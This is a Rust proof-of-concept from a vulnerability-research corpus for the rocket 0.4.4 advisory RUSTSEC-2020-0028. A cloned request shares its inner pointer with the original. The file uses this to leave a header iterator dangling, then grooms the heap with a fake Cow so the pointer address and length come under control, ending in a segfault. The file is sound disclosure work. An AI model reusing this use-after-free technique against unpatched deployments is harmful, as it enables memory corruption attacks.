/*!
```rudra-poc
[target]
crate = "rocket"
version = "0.4.4"

[[target.peer]]
crate = "rocket_codegen"
version = "0.4.4"

[[target.peer]]
crate = "rocket_http"
version = "0.4.4"

[test]
analyzers = ["manual"]
cargo_toolchain = "nightly"

[report]
title = "`LocalRequest::clone` creates multiple mutable references to the same object"
description = """
The affected version of `rocket` contains a `Clone` trait implementation of
`LocalRequest` that reuses the pointer to inner `Request` object.
This causes data race in rare combinations of APIs if the original and the
cloned objects are modified at the same time."""
code_snippets = ["https://github.com/SergioBenitez/Rocket/blob/ca4d1572d408fd8dd13db103926ad96da878126d/core/lib/src/local/request.rs#L477-L487"]
patched = [">= 0.4.5"]
unaffected = ["< 0.4.0"]
informational = "unsound"
issue_url = "https://github.com/SergioBenitez/Rocket/issues/1312"
issue_date = 2020-05-27
rustsec_url = "https://github.com/RustSec/advisory-db/pull/320"
rustsec_id = "RUSTSEC-2020-0028"
```
!*/
#![forbid(unsafe_code)]

use rocket::http::Header;
use rocket::local::Client;
use rocket::Request;

fn main() {
    let client = Client::new(rocket::ignite()).unwrap();

    // creates two LocalRequest instances that share the same Request pointer
    let request1 = client.get("/").header(Header::new("key", "val1"));
    let request2 = request1.clone();

    // sanity check
    assert_eq!(
        request1.inner() as *const Request<'_>,
        request2.inner() as *const Request<'_>
    );

    // save the iterator, which internally holds a slice
    let mut iter = request1.inner().headers().get("key");

    // insert headers to reallocate the header map
    request2
        .header(Header::new("1", "v1"))
        .header(Header::new("2", "v2"))
        .header(Header::new("3", "v3"))
        .header(Header::new("key", "val2"));

    // heap massage
    let arr: [usize; 4] = [0, 0xcafebabe, 31337, 0]; // fake Cow
    let addr = &arr as *const _ as usize;
    let _v: Vec<usize> = vec![
        0, 0, 0, 0, 0, addr, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    ];

    // iter is dangling now!
    let s = iter.next().unwrap();

    // address and length controlled
    dbg!(s.as_ptr());
    dbg!(s.len());

    // segfaults
    println!("{}", s);
}
